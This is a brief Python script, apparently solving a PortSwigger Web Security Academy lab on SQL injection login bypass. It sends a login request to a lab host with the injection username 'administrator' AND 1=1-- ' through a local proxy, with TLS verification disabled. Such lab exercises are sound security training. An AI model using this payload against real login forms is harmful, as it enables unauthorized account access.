# https://portswigger.net/web-security/sql-injection/lab-login-bypass

import requests
requests.packages.urllib3.disable_warnings()

url = "https://ac101f3c1faa3695801524a100df006b.web-security-academy.net/login"
proxy = "127.0.0.1:8080"
proxies = {"https": proxy, "http": proxy}
verify = False
cookies = {"session": "Need a valid session token here"}

u = "administrator' AND 1=1-- "
data = {"username": u, "password": "p", "csrf": "Need a valid CSRF token here"}

requests.post(url, data=data, verify=verify, proxies=proxies, cookies=cookies)